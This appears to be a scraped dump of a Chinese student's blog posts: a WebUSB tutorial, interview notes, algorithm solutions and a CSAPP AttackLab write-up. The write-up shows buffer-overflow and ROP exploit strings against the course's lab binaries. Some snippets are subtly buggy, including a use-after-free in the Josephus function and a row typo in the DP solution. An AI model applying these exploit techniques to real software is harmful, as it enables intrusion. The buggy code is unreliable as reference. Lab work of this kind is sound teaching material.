123456789101112131415161718192021222324// usb.js(function(window, navigator) &#123; &quot;use strict&quot;; var USBWrapperInit = function() &#123; var UsbWrapper = new function() &#123; this.hasUSB = navigator &amp;&amp; navigator.usb; if (!this.hasUSB) &#123; console.log(&#x27;Your browser does not support usb&#x27;) return; &#125; this.connect = () =&gt; &#123; return navigator.usb .requestDevice(&#123;filters: []&#125;) .catch(e =&gt; &#123; console.log(e); return null; &#125;); &#125;; this.usb = navigator.usb; &#125;; window.USBWrapper = UsbWrapper; &#125;; window.USBWrapperInit = USBWrapperInit;&#125;)(window, navigator); 编写 Config 类本应用的逻辑是新建一个 Config 的同时连接到想要配置的 USB 设备，这样就能将一个连接对应到一个配置上。同样的，把 Config 类赋值给 window 以便全局使用。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859// config.js(function(window, document) &#123; &quot;use strict&quot;; var device; const genLog = function(html) &#123; var log = document.getElementById(&#x27;log&#x27;); log.innerHTML += html + &#x27;&lt;br/&gt;&#x27;; log.scrollTop = log.scrollHeight; &#125; const clearLog = function() &#123; var log = document.getElementById(&#x27;log&#x27;); log.innerHTML = &quot;USB CONFIG TEST&quot; &#125; class Config &#123; constructor() &#123; genLog(&quot;USB CONFIG TEST&quot;) &#125; connect(selectedDevice) &#123; console.log(selectedDevice); device = selectedDevice; genLog(&quot;Opening Device...&quot;); return device.open() .then(() =&gt; &#123; genLog(`$&#123;device.productName&#125;($&#123;device.manufacturerName&#125;) connected.`) &#125;) .catch(err =&gt; &#123; genLog(err); if (device &amp;&amp; device.opened) &#123; device.close(); &#125; &#125;) &#125; newConnection() &#123; return window.USBWrapper.connect() .then(device =&gt; &#123; if (!device) &#123; return Promise.reject(&quot;No device selected&quot;); &#125; this.connect(device); &#125;) &#125; close() &#123; if (!device || !device.opened) &#123; return Promise.reject(&quot;Device not opened&quot;); &#125; genLog(&quot;Closing Device...&quot;); return device.close() .then(() =&gt; &#123; genLog(&#x27;Device closed.&#x27;) &#125;) &#125; &#125;; window.Config = Config; window.genLog = genLog; window.clearLog = clearLog;&#125;)(window, document); 编写 html 页面并加载上面两个脚本123456789101112131415161718192021222324252627282930313233&lt;!DOCTYPE html&gt;&lt;html&gt; &lt;head&gt; &lt;title&gt;usb test&lt;/title&gt; &lt;script type=&quot;text/javascript&quot; src=&quot;js/usb.js&quot;&gt;&lt;/script&gt; &lt;script type=&quot;text/javascript&quot; src=&quot;js/config.js&quot;&gt;&lt;/script&gt; &lt;script type=&quot;text/javascript&quot;&gt; window.addEventListener(&quot;load&quot;, function() &#123; USBWrapperInit(); if(USBWrapper.hasUSB) &#123; config = new Config(); navigator.usb.getDevices() .then(devices =&gt; &#123; if(devices.length) &#123; config.connect(devices[0]); &#125; &#125;); navigator.usb.addEventListener(&#x27;connect&#x27;, event =&gt; &#123; config.connect(event.device); &#125;); &#125; &#125;); &lt;/script&gt; &lt;/head&gt; &lt;body&gt; &lt;div&gt; &lt;div id=&quot;log&quot; class=&quot;hidden&quot;&gt;&lt;/div&gt; &lt;button id=&quot;connectBtn&quot; onclick=&quot;config.newConnection()&quot;&gt;connect&lt;/button&gt; &lt;button id=&quot;disconnectBtn&quot; onclick=&quot;config.close()&quot;&gt;disconnect&lt;/button&gt; &lt;button id=&quot;clearBtn&quot; onclick=&quot;window.clearLog()&quot;&gt;clear log&lt;/button&gt; &lt;/div&gt; &lt;/body&gt;&lt;/html&gt; 后续实现以上的代码，就已经可以通过网页连接到 USB 设备了。可以打开 Chrome 的控制台查看连接后生成的 USBDevice 对象，里面有符合 USB 协议的各种信息。 接下来就是如何进行配置操作了。为了完成这一点，还需要设备端编写 USB 驱动程序并运行在设备的内核才行。怎么样传数据，就自己和设备端那边商量就行了。 对于这个 Web 应用，还需要做的就是给 Config 类添加各种配置的方法，其核心是调用 12var promise = USBDevice.transferIn(endpointNumber, length)var promise = USBDevice.transferOut(endpointNumber, data) 这两个方法，进行 USB 的数据读取与写入操作。只要和设备端协商好了，接下来的就都好说了。 写在最后虽然我是在后台岗位实习，但是是着实干了很多前端的活啊。。。这两天也看了不少 HTML、CSS、Javascript、Typescript 的东西。。。感觉学到的都是一些奇奇怪怪的东西（针对于我想学更多后端的东西而言）。 对于 USB 协议与 Web 更深层次的东西我就不懂了，本项目也只是浅尝辄止。如果上面写的有什么错误或者可以提升的地方，您可以联系我（虽然我觉得应该不会有人看到我的博文），非常感谢。 最后的最后API 文档 https://developer.mozilla.org/en-US/docs/Web/API/USB https://developer.mozilla.org/en-US/docs/Web/API/USBDevice and more…","tags":["Javascript","学习","Web USB"],"categories":["编程开发"]},{"title":"4月9日字节跳动视频架构后台开发面经","path":"/2020-4-9-bytedance-interview/","content":"4月9日字节跳动视频架构后台开发面经 一面 项目经历 简单问了一下我大一下的的一个大作业车间调度算法的实现。 基础知识 进程和线程的区别。 CPU 调度的最小单位是什么。 HTTP 与 HTTPS 的区别。 知道哪些数据库引擎。 ​ 我就只知道 InnoDB。。。 对称加密与非对称加密的区别。 数据库中 inner join 和 left join 的区别。 使用 select 语句分页查询的效率如何，比如查询前 100 个记录和后 100 个记录效率比较。 数据库事务的特点并解释。 ​ 即 ACID。（当时有点慌没有答好。。） 平衡二叉树和红黑树的定义。谁的查找效率更好？谁的插入效率更高？ ​ 平衡二叉树更好查找，因为它更矮更平均。红黑树的维护没有平衡二叉树那么复杂，所以插入效率更高。 ARP 协议的过程。 不同架构的机器（如 x86 和 arm）编译的可执行文件可以在对方机器上运行吗？为什么？要如何才能在不同架构的机器上执行？可以在一种架构的机器上编译另一种架构机器的可执行文件吗？如何做到？ Linux 会用吗？ Linux 如何查看文件权限。 操作系统进程调度的几种算法。 算法 单链表反转。（手写） Top K 问题。 具体问法是 100w 个无序数据中选 100 个最大的数据。一开始我还在往位图算法上想。。。结果经面试官一提醒，直接建立一个容量为 100 的大根堆就行了。。 二面 基础知识 C++ static 关键字的作用。 C++ 中重载和重写分别是什么？ C++ 的动态绑定是怎样的？ ​ 一开始没理解面试官的意思，然后突然想起他应该指的是虚函数的动态绑定。 对 Python 多线程的理解。 对协程的看法。 知道哪些内存泄漏的例子。 TCP 与 UDP 的区别。 socket 编程中使用 TCP 连接的过程。 知道 RPC 吗？ ​ 这个只知道叫 远程过程调用，具体不清楚。。 小端模式与大端模式。 算法 最大子段和。（手写） 统计一个数二进制中 1 的个数。（手写） 有很多种方法，可参考 https://www.cnblogs.com/graphics/archive/2010/06/21/1752421.html 提问环节 问了下他们的业务。 三面​ 三面只有十分钟，没有问什么技术问题。问了我对实习的看法，以后的规划。然后问我本科期间最后成就感的事情，然后给他看了下我的博客。基本上就是确认我会过去进行一段较长时间的实习。 总结​ 首先要感谢耿总的内推，不过耿总五月份就要去 aws 走上他的架构师之路了，这里要由衷地说一句**太强了**。 ​ 头条的效率是真的高，一天下午就搞完三面。自己来说感觉还是比较充分的，不过还是有点小小的紧张，有很多问题都是张口就来，没有好好的思考，不过面试官都挺好的，我好几次都是经过面试官提醒才突然改答案，这么一想还有点尴尬。。。后来也渐渐进入状态。 ​ 我面试的小组目前做的是云游戏的内容（没想到头条也在搞云游戏），不过目前还只是起步阶段，后台开发主要是做云游戏的调度等工作，然和后其他视频平台比如抖音做对接。只能说是很巧了，我的的确确对云游戏很感兴趣，这里要再次感谢耿总的内推。二面的时候我还问了下面试官腾讯的云游戏（指堡垒之夜）没有办法进行语音，不知道这是为什么，是有技术上的问题吗，然后面试官：你来就知道了（笑）。","tags":["字节跳动面试"],"categories":["面经"]},{"title":"4月1日腾讯 TEG 后台开发一轮面试凉经","path":"/2020-4-1-tx-interview/","content":"4月1日腾讯 TEG 后台开发一轮面试凉经 面试过程 一开始介绍自己写的几个项目（其实就是大作业） 基础知识 TCP 的三次握手和四次挥手 DNS 的原理 C++ vector 的原理和实现 C++ 的多态 这里主要问的是虚函数的实现机制，也就是虚函数表 + 虚表指针，然后问了虚函数表是属于谁（类还是实例）。 C++ 构造函数为什么不能是虚函数 因为调用虚函数需要虚表指针，但是虚表指针需要对象实例化之后才分配内存。 然后问了一个代码的运行效果 123456789101112131415#include &lt;iostream&gt;using namespace std;class A &#123;public: virtual void func() &#123; cout &lt;&lt; &quot;Hello&quot; &lt;&lt; endl; &#125;&#125;;int main() &#123; A *p = nullptr; p-&gt;func(); return 0;&#125; 一开始我说会运行失败，因为 p 没有分配内存。然后面试官让我下来自己跑跑看。我还以为会有什么意想不到的结果，之后我自己跑了下看看发现发生了段错误 segmentation fault，那不是和我想的一样吗，可能我们都误解了对方的意思。。。 算法题 LRU cache 的实现，要求时间复杂度为 O(1) 这是 LeetCode 上一道很经典的算法题。我一开始想用哈希表来做，也想过用优先队列，但是都没办法实现 get() 和 set() 都是 O(1)。然后最后也没有想出来。后来在网上查，方法是双向链表 + 哈希表（面试官还提示了我可能不止用一种数据结构 23333）。 LeetCode 上对这个问题的分析： 哈希表查找快，但是数据无固定顺序；链表有顺序之分，插入删除快，但是查找慢。所以结合一下，形成一种新的数据结构：哈希链表。 来源：https://leetcode-cn.com/problems/lru-cache/solution/lru-ce-lue-xiang-jie-he-shi-xian-by-labuladong/ 现在用 C++ 实现一下。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950#include &lt;list&gt;#include &lt;unordered_map&gt;using namespace std;class LRUCache &#123;private: // 容量 int capacity; // STL 中的双向链表 // 元素为 Key-Value 键值对 list&lt;pair&lt;int, int&gt; &gt; cache; // STL 中的哈希表 // Value 为双向链表上某一元素的位置，用迭代器保存 unordered_map&lt;int, list&lt;pair&lt;int, int&gt; &gt;::iterator&gt; map;public: LRUCache(int c) &#123; this-&gt;capacity = c; &#125; int get(int key) &#123; auto it = map.find(key); if (it == map.end()) return -1; pair&lt;int, int&gt; kv = *map[key]; cache.erase(map[key]); cache.push_front(kv); map[key] = cache.begin(); return kv.second; &#125; int put(int key, int value) &#123; auto it = map.find(key); if (it == map.end()) &#123; if (cache.size() == capacity) &#123; auto last = cache.back(); int last_key = last.first; map.erase(last_key); cache.pop_back(); &#125; cache.push_front(make_pair(key, value)); map[key] = cache.begin(); &#125; else &#123; cache.erase(map[key]); cache.push_front(make_pair(key, value)); map[key] = cache.begin(); &#125; &#125;&#125;; 判断字符串是否有重复字符（C++ 实现） 我用了 STL 里的 map 来实现。时间复杂度算上 map 的原理是 O(nlogn)，然后面试官就问我 map 的实现原理。我说可能是哈希表或者是二叉树，然后他告诉我 hash_map（C++ 标准库中叫 unordered_map） 才是哈希表，map 的原理是红黑树。 最后面试官介绍了下他们部门 腾讯的 TEG，很好的一个技术向的部门，可惜我去不了。。 总结​ 面试官挺好的，一直很有耐心的在听我描述，然后也一直在和我一起讨论问题，引导我做一些更多的尝试。面试的过程挺轻松，我一开始还挺紧张，后来就越来放下心来回答问题。最后也滔滔不绝地给我介绍了他们部门。结果最后给我来一个当头棒喝。。就是他们部门的后台开发只有深圳。。。。然后我说我去不了深圳，然后面试官确认了一下我不会去深圳，结束面试过后就把流程变灰了。。。。可谓是秒凉。。。 ​ 有一种努力全白费的感觉，就当是吸取面试经验了。。","tags":["腾讯面试","C++"],"categories":["面经"]},{"title":"阿里 3月25日 笔试第一题","path":"/2020-3-25-ali/","content":"题目描述： 给定一个 3 * n 的矩阵，从每列选取一个元素组成一个新的长度为 n 的数组。求此数组前后元素之间差值的绝对值之和最小。 示例： 5 9 5 4 44 7 4 10 32 10 9 2 3结果为 5。选取的元素为 5 7 5 4 4 这题一开始我用的贪心，浪费了十多二十分钟才发现不能直接贪。。然后二话不说就开始回溯，然后我本来写回溯就要很久。。然后又出了各种 bug 调试了半天最后没时间了。。。回溯写出来应该是对的，但是跑到 30% 的时候就爆栈了。。然后也没时间再慢慢思考了。。。所以说做 OJ 还是不要轻易用回溯。 所以这道题应该用动规。。 1234567891011121314151617n = int(input())b = []for i in range(3): a = list(map(int, input().split(&#x27; &#x27;))) b.append(a)dp = [[0 for i in range(n)] for j in range(n)]for j in range(1, n): for i in range(3): dp[i][j] = min(abs(b[i][j] - b[0][j - 1]) + dp[0][j - 1], abs(b[i][j] - b[1][j - 1]) + dp[1][j - 1], abs(b[i][j] - b[1][j - 1]) + dp[1][j - 1]) print(min(dp[0][n - 1], dp[1][n - 1], dp[2][n - 1])) 下来之后回想还是挺简单的。。但是我做算法题本来就比较慢，思考要思考半天。。感觉再怎么刷题也没办法提升我的速度。。然后还有时间限制，就更慌了。。。 不该啊不该。。什么时候才能身经百战游刃有余。。。。","tags":["算法题","阿里面试","Python","动态规划","矩阵"],"categories":["算法题"]},{"title":"约瑟夫环问题","path":"/Josephus/","content":"n 个人（编号 0 ~ n-1）围成环，从 0 开始报数（最开始从编号 0 开始），报到（m-1）的退出，剩下的人继续从 0 开始报数（从退出的人下一个人开始）。求最后留下来的人的编号。 解法： 用数组或者链表模拟整个过程。 数学推导。 这里就只写数学推导的方法了。 第一次：从 0 开始报数，(m-1) mod n 出圈。 第二次：从 m mod n 开始报数，假设 k = m mod n，这里形成了新的约瑟夫环 k, k+1, …, n - 1, 0, 1, 2, …, k-2。将编号整体减 k 模 n - 1，得到 0, 1, 2, … , n-2，这又变成了 n-1 个人的约瑟夫环问题了。 由此类推，可以得知约瑟夫环问题存在递推关系。 设 i 个人报 m 个数情况下的胜者编号为 f[i]，可以轻易地得出以下递推关系： f[1] = 0 f[i] = (f[i-1] + m) mod i (i &gt; 1) 于是便可以容易地编写出代码了。 1234567891011int Josephus(int n, int m) &#123; if (m &lt; 0 || n &lt; 1) return -1; int* f = new int[n + 1]; f[1] = 0; for (int i = 2; i &lt;= n; i++) f[i] = (f[i - 1] + m) % i; delete[] f; return f[n]; &#125;","tags":["算法题","动态规划","C++","约瑟夫环"],"categories":["算法题"]},{"title":"是否是数字","path":"/if-str-is-number/","content":"一道很恶心的题。如果真的是笔试时候不知道自己哪种例子没过就凉凉。 请实现一个函数用来判断字符串是否表示数值（包括整数和小数）。例如，字符串”+100”,”5e2”,”-123”,”3.1416”和”-1E-16”都表示数值。 但是”12e”,”1a3.14”,”1.2.3”,”+-5”和”12e+4.3”都不是。 遇到的坑： 小数点前可以什么都没有。+.123 这种也算做数字，也可以添加正负号。 e/E 后面必须有数字 Python 没有 switch 那就暴力 if-else 了。（其实我想用 C++ 的，但用都用 Python 了就继续吧。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061def isNumeric(s): # write code here if len(s) == 0 or s == &#x27;+&#x27; or s == &#x27;-&#x27; or s == &#x27;e&#x27; or s == &#x27;E&#x27; or s == &#x27;.&#x27;: return False numbers = [&#x27;0&#x27;,&#x27;1&#x27;,&#x27;2&#x27;,&#x27;3&#x27;,&#x27;4&#x27;,&#x27;5&#x27;,&#x27;6&#x27;,&#x27;7&#x27;,&#x27;8&#x27;,&#x27;9&#x27;] signs = [&#x27;+&#x27;, &#x27;-&#x27;] e = [&#x27;e&#x27;, &#x27;E&#x27;] if s[0] not in numbers + signs: return False if s[0] in signs: state = 0 else: state = 1 for i in range(1, len(s)): if state == 0: if s[i] in numbers + [&#x27;.&#x27;]: if s[i] in numbers: state = 1 else: state = 2 else: return False elif state == 1: if s[i] in numbers + e + [&#x27;.&#x27;]: if s[i] == &#x27;.&#x27;: state = 2 elif s[i] in e: if i == len(s) - 1: return False state = 3 else: return False elif state == 2: if s[i] in numbers: state = 5 else: return False elif state == 3: if s[i] in signs + numbers: state = 4 else: return False elif state == 4: if s[i] not in numbers: return False elif state == 5: if s[i] in numbers + e: if s[i] in e: state = 3 else: return False return True","tags":["算法题","Python","状态机"],"categories":["算法题"]},{"title":"数组中的逆序对","path":"/inverse-pairs/","content":"题目描述： 在数组中的两个数字，如果前面一个数字大于后面的数字，则这两个数字组成一个逆序对。输入一个数组,求出这个数组中的逆序对的总数P。并将P对1000000007取模的结果输出。 即输出P%1000000007。 输入描述： 题目保证输入的数组中没有的相同的数字。数据范围：&nbsp;&nbsp;&nbsp;&nbsp;对于%50的数据,size&lt;=10^4&nbsp;&nbsp;&nbsp;&nbsp;对于%75的数据,size&lt;=10^5&nbsp;&nbsp;&nbsp;&nbsp;对于%100的数据,size&lt;=2*10^5 示例： 输入： 1,2,3,4,5,6,7,0 输出： 7 思路：分治法，类似归并排序的做法。分别计算每小组的逆序对，然后再将其归并排序得到一个大组，然后就可以算出更大组之间的逆序对了。最后得到整个数组的逆序对个数。 代码实现： 12345678910111213141516171819202122232425262728293031323334353637def InversePairs(data): # write code here def mergeSort(data, left, right): if left == right: return 0 print(left, right) mid = (left + right) // 2 left_count = mergeSort(data, left, mid) right_count = mergeSort(data, mid + 1, right) two_side_count = merge(data, left, mid, right) return left_count + two_side_count + right_count def merge(data, left, mid, right): i, j, count = left, mid + 1, 0 temp = [] while i &lt;= mid and j &lt;= right: if data[i] &lt;= data[j]: temp.append(data[i]) i += 1 else: temp.append(data[j]) j += 1 count += mid - i + 1 while i &lt;= mid: temp.append(data[i]) i += 1 while j &lt;= right: temp.append(data[j]) j += 1 data[left: right + 1] = temp del temp return count if len(data) == 0: return 0 return mergeSort(data, 0, len(data) - 1) % 1000000007","tags":["算法题","Python","分治法","归并排序"],"categories":["算法题"]},{"title":"正则匹配","path":"/regular-match/","content":"这题每次做的时候都想半天，记录一下。 可以使用递归或者动规的方法。 请实现一个函数用来匹配包括’.’和’*‘的正则表达式。模式中的字符’.’表示任意一个字符，而’*‘表示它前面的字符可以出现任意次（包含0次）。 在本题中，匹配是指字符串的所有字符匹配整个模式。例如，字符串”aaa”与模式”a.a”和”ab*ac*a”匹配，但是与”aa.a”和”ab*a”均不匹配。 本算法的正则匹配是贪婪匹配 12345678910111213141516171819202122bool match(char* str, char* pattern)&#123; if (*str == &#x27;\\0&#x27; &amp;&amp; *pattern == &#x27;\\0&#x27;) return true; if (*pattern == &#x27;\\0&#x27;) return false; if (*(pattern + 1) != &#x27;*&#x27;) &#123; if (*str == *pattern || (*str != &#x27;\\0&#x27; &amp;&amp; *pattern == &#x27;.&#x27;)) return match(str + 1, pattern + 1); else return false; &#125; else &#123; // * 匹配 0 个或多个 if (*str == *pattern || (*str != &#x27;\\0&#x27; &amp;&amp; *pattern == &#x27;.&#x27;)) return match(str + 1, pattern) || match(str, pattern + 2); else return match(str, pattern + 2); &#125;&#125;","tags":["算法题","C++","分治法","正则匹配","递归"],"categories":["算法题"]},{"title":"AttackLab","path":"/attacklab/","content":"CSAPP ATTACKLAB 实验总结 实验环境 macOS Mojave 10.14.1 iTerm2 终端 实验内容详见 http://csapp.cs.cmu.edu/3e/attacklab.pdf 开始吧准备工作： 登陆学校服务器 ssh xxxxxxxxxx@10.120.11.13 解压target tar -xvf target99.tar 将实验所需要的两个程序ctarget和rtarget反汇编 objdump -d ctarget &gt; disobjdump -d rtarget &gt; dis2 正式开始： Part I: Code Injection AttacksLevel 1根据实验内容pdf文档可以知道，这项内容是让我通过一些操作触发touch1函数。文档中提供了getbuf函数、test函数和touch1函数的C语言代码： 123456789101112131415161718192021unsigned getbuf() &#123; char buf[BUFFER_SIZE]; Gets(buf); return 1;&#125;void test()&#123; int val; val = getbuf(); printf(&quot;No exploit. Getbuf returned 0x%x &quot;, val);&#125;void touch1() &#123; vlevel = 1; /* Part of validation protocol */ printf(&quot;Touch1!: You called touch1() &quot;); validate(1); exit(0);&#125; 我们可以看出getbuf会从缓冲区读入数据存入buf数组中，而我就可以利用这个buf数组的大小限制对代码进行攻击，使得getbuf执行完后不返回到test，而是跳转到touch1从而达到目的。接下来需要找到BUFFER_SIZE的大小。因此查看getbuf函数的反汇编代码： 123456780000000000401768 &lt;getbuf&gt;:401768: 48 83 ec 18 sub $0x18,%rsp40176c: 48 89 e7 mov %rsp,%rdi40176f: e8 36 02 00 00 callq 4019aa &lt;Gets&gt;401774: b8 01 00 00 00 mov $0x1,%eax401779: 48 83 c4 18 add $0x18,%rsp40177d: c3 retq40177e: 66 90 xchg %ax,%ax 看到一开始%rsp减少了0x18可以判断出，这个buffer的大小就是0x18个字节，即24个字节。也就是说，我需要将这24个字节填满，再注入一条touch1的返回地址即可将原返回地址覆盖，使得getbuf之后返回到touch1. 查看touch1的反汇编代码可以得到它的地址为0x401780。因为实验环境为小端机器，所以我们可以构造输入的攻击代码段为： 123400 00 00 00 00 00 00 0000 00 00 00 00 00 00 0000 00 00 00 00 00 00 0080 17 40 00 00 00 00 00 按照attacklab.pdf中介绍的方法我们对ctarget进行攻击:./hex2raw &lt; phase1 | ./ctarget 程序运行提示成功： 12345Cookie: 0x286582b8Type string:Touch1!: You called touch1()Valid solution for level 1 with target ctargetPASS: Sent exploit string to server to be validated.NICE JOB! Level 2先来看touch2的代码： 12345678910111213void touch2(unsigned val)&#123; vlevel = 2; /* Part of validation protocol */ if (val == cookie) &#123; printf(&quot;Touch2!: You called touch2(0x%.8x) &quot;, val); validate(2); &#125; else &#123; printf(&quot;Misfire: You called touch2(0x%.8x) &quot;, val); fail(2); &#125; exit(0); &#125; 从这段代码看出来我需要为touch2设置一个参数val，它的值为target为我提供的cookie:0x286582b8，所以这次攻击与上一次唯一的区别就是我在返回到touch2之前必须要它的第一个参数设置为cookie的值。而函数的第一个参数都存在寄存器%rdi中，于是我需要构造一段代码将cookie的值存到%rdi中，并设置%rsp中新的返回地址为存储touch2地址的栈中地址： 123movq $0x286582b8, %rdimovq $0x5567b418, %rspret 将编译后反汇编： 1230: 48 c7 c7 b8 82 65 28 mov $0x286582b8,%rdi7: 48 c7 c4 18 b4 67 55 mov $0x5567b418,%rspe: c3 retq 可以得到这段指令的机器代码。而它就是我需要注入到程序中的攻击代码。另外我们需要将返回地址设置为到这段代码（指令）的地址，即getbuf函数执行后%rsp中存储的地址。运行gdb到getbuf分配内存后的指令，并查看%rsp中的值： 123456789101112131415161718192021(gdb) b getbufBreakpoint 1 at 0x401768: file buf.c, line 12.(gdb) rStarting program: /home/students/2017211613/target99/ctargetsCookie: 0x286582b8Breakpoint 1, getbuf () at buf.c:1212 buf.c: No such file or directory.(gdb) s14 in buf.c(gdb) disasDump of assembler code for function getbuf:0x0000000000401768 &lt;+0&gt;: sub $0x18,%rsp=&gt; 0x000000000040176c &lt;+4&gt;: mov %rsp,%rdi0x000000000040176f &lt;+7&gt;: callq 0x4019aa &lt;Gets&gt;0x0000000000401774 &lt;+12&gt;: mov $0x1,%eax0x0000000000401779 &lt;+17&gt;: add $0x18,%rsp0x000000000040177d &lt;+21&gt;: retqEnd of assembler dump.(gdb) p/x $rsp$1 = 0x5567b408 可以得到此段栈帧的栈顶地址为0x5567b408，然后与之前一样得到touch2的地址：0x4017ac这样我就得到这次攻击的代码段： 123448 c7 c7 b8 82 65 28 48c7 c4 18 b4 67 55 c3 00ac 17 40 00 00 00 00 0008 b4 67 55 00 00 00 00 注入攻击：./hex2raw &lt; phase2 | ./ctarget 成功: 12345Cookie: 0x286582b8Type string:Touch2!: You called touch2(0x286582b8)Valid solution for level 2 with target ctargetPASS: Sent exploit string to server to be validated.NICE JOB! Level 3先来康康touch3的代码： 1234567891011121314151617181920212223/* Compare string to hex represention of unsigned value */int hexmatch(unsigned val, char *sval)&#123; char cbuf[110]; /* Make position of check string unpredictable */ char *s = cbuf + random() % 100; sprintf(s, &quot;%.8x&quot;, val); return strncmp(sval, s, 9) == 0;&#125;void touch3(char *sval)&#123; vlevel = 3; /* Part of validation protocol */ if (hexmatch(cookie, sval)) &#123; printf(&quot;Touch3!: You called touch3(\\&quot;%s\\&quot;) &quot;, sval); validate(3); &#125; else &#123; printf(&quot;Misfire: You called touch3(\\&quot;%s\\&quot;) &quot;, sval); fail(3); &#125; exit(0); &#125; 可以看出，这个和level2其实差不多，区别在于cookie在此需要以字符串的形式保存，而且传入touch3的参数是这段字符串的地址。按照和之前一样的步骤，先找到touch3的地址：0x401880，getbuf栈帧栈顶地址0x5567b408不变。cookie字符串所对应的16进制为：32 38 36 35 38 32 62 38 00（**因为是字符串所以最后有字符’\\0’**）。因为buffsize有限，所以我将cookie存在更后面的位置。与level2同理，写出一些需要改变寄存器值的操作： 123movq $0x5567b428, %rdimovq $0x5567b410, %rspret 将其编译后反汇编得到机器代码 12348 c7 c7 08 b4 67 55 48 c7 c4 10 b4 67 55 c3 然后就得出了最后的攻击代码： 12345648 c7 c7 28 b4 67 55 48c7 c4 18 b4 67 55 c3 0080 18 40 00 00 00 00 0008 b4 67 55 00 00 00 0032 38 36 35 38 32 62 3800 注入攻击：./hex2raw &lt; phase3 | ./ctarget成功： 12345Cookie: 0x286582b8Type string:Touch3!: You called touch3(&quot;286582b8&quot;)Valid solution for level 3 with target ctargetPASS: Sent exploit string to server to be validated.NICE JOB! Part II: Return-Oriented ProgrammingLevel 2老师上课讲了ROP的基本思想，因为栈的保护机制，我们无法像Part I中一样获取栈的地址，而且插入的代码也无法执行，但我们还可以通过程序中存在的一些函数，它们的机器代码通过截取一段可以构成新的不同意义的指令（带ret）。而这些指令就可以帮助我完成攻击。通过查表并对应farm中的反汇编代码，我整理出来了一些可用的gadgets（都带有ret）： 函数名 对应指令 指令的起始地址 setval_487 movq %rax,%rdi 0x401917 setval_487 movl %eax,%edi 0x401918 addval_207 popq %rax 0x401925 setval_316 popq %rax 0x401941 setval_153 movl %esp,%eax 0x40197f setval_181 movl %ecx,%edx 0x401994 addval_103 movq %rsp,%rax 0x4019ae getval_178 movl %eax,%ecx 0x4019d5 getval_308 movl %edx,%esi 0x4019f0 add_xy lea (%rdi,%rsi,1),%rax 0x40194a 要触发touch2，我将栈构造如下（高地址到低地址，8字节一个单位）： 栈底 …… &amp;touch2 movq %rax,%rdiret cookie:0x286582b8 popq %raxret buf的24个字节 栈顶 根据以上信息对照我列出的gadgets表可以构造出phase4代码： 123456700 00 00 00 00 00 00 0000 00 00 00 00 00 00 0000 00 00 00 00 00 00 0041 19 40 00 00 00 00 00b8 82 65 28 00 00 00 0017 19 40 00 00 00 00 00ac 17 40 00 00 00 00 00 注入攻击：./hex2raw &lt; phase4 | ./rtarget成功： 12345Cookie: 0x286582b8Type string:Touch2!: You called touch2(&quot;286582b8&quot;)Valid solution for level 2 with target rtargetPASS: Sent exploit string to server to be validated.NICE JOB! Level 3最终目的和Part I中的level3一样，要将cookie所在字符串的地址传入%rdi并触发touch3。我构造了这样一个步骤： 栈底 …… cookie:0x323836353832623800 &amp;touch3 movq %rax,%rdi lea (%rdi,%rsi,1),%rax movq %rax,%rdi movq %rsp,%rax movl %edx,%esi movl %ecx,%edx movl %eax,%ecx bias:0x20 popq %raxret buf的24个字节 栈顶 再对照我列的gadgets表写出攻击代码： 12345678910111213141500 00 00 00 00 00 00 0000 00 00 00 00 00 00 0000 00 00 00 00 00 00 0041 19 40 00 00 00 00 0020 00 00 00 00 00 00 00d5 19 40 00 00 00 00 0094 19 40 00 00 00 00 00f0 19 40 00 00 00 00 00ae 19 40 00 00 00 00 0017 19 40 00 00 00 00 004a 19 40 00 00 00 00 0017 19 40 00 00 00 00 0080 18 40 00 00 00 00 0032 38 36 35 38 32 62 3800 注入攻击：./hex2raw &lt; phase5 | ./rtarget成功： 12345Cookie: 0x286582b8Type string:Touch3!: You called touch3(&quot;286582b8&quot;)Valid solution for level 3 with target rtargetPASS: Sent exploit string to server to be validated.NICE JOB! 本次实验结束 总结体会这次的AttackLab相比于上次的BombLab更让我感觉pro了一点。这次的实验让我体验了一把黑客的感觉。虽然现在不可能有那么简单的漏洞能让我这么轻易的攻击。这次主要是考察了我对函数调用以及栈的理解。在做最后一个攻击的时候我犯了一个很弱智的错误，那就是把地址放在32位寄存器里传递，浪费了我半个小时的睡眠时间。在某些意义上这次实验比上一次实验还更为简单，只要掌握了对机器执行指令时栈以及相关寄存器的作用很容易就能完成本次实验。不过我们实验发的也太晚了吧，九点过才发，我开始做的时候其他一个班的大佬都已经做完了。而且我本来就做得慢，晚上看动画片的时间都耽搁了。不过还好在熄灯前把它弄完了。这学期唯一有计算机专业感觉的课就只有这门课了，希望老师给我们带来更多有趣的知识。","tags":["实验报告"],"categories":["课程学习"]},{"title":"铃酱的盒蛋终于到了","path":"/rin-egg/","content":"经过漫长的等待，在某宝买的单个的铃的盒蛋终于到了（虽然我也想买一套六个的，但是没钱） 为什么是让用户自己贴纸啊。。。印上去不好吗。。。我这种手残果不其然把贴纸贴残了。。。 Rin为什么这么可爱？这还用问吗？","tags":["镜音铃"],"categories":["兴趣爱好"]},{"title":"【初音ミク】セブンティーナ(Seventina)【はるまきごはん】","path":"/seventina/","content":"Music &amp; Words &amp; Illust &amp; Movie：はるまきごはん 这首歌虽然半个月前就在外网投了，但昨天春卷饭才在b站投稿，不过竟然有官方中文字幕，好评呀！春卷饭自己画的pv画风也很萌啊wwww（不过我还是最喜欢拉马子）现在的V+P主们真是全才，会作词会作曲，会画画，有些还亲自翻唱（这还能叫翻唱吗？）而且唱的还很好听。曾经有段时间我也很想自己用vocaloid编曲来着，但是我乐理几乎不懂23333。lmq(梦酱)很喜欢春卷饭来着，最近在狂吹春卷饭的上上个投稿。 链接 b站 nico youtube 歌词間違ってばっかの私は「大丈夫なんだ」って言うけれど ほんとの本当はガラスよりも繊細だ 強がってばっかの私はそういえば学校の帰り道なんども何度も泣いたこともあったっけ 夢と現実と画面の間月に何回か限りのミッドナイト セブンティーンなフォーチュネスだけどたまに不安になってわかんないよフューチャー10年後の私なんてセブンティーンはセンシティブほんの小さなくしゃみで世界ひとつ終わるくらいなんて脆弱なんだろうなセブンティーナ で、学校行ったら俯き気味で自分の席までシミュレイション気まずいあの子と仲良いあの子の対角線上点Me ひとりぼっちにはなんない様にだいぶ繊細なガラスのハートさ セブンティーンはロンリネスだからいつも不安になってわかっちゃうよフューチャー1000年後の私なんてセブンティーンはカンガエル私が泣いた数だけ知らぬ人が笑ふくらひあな不平等なんだろうなセブンティーナ 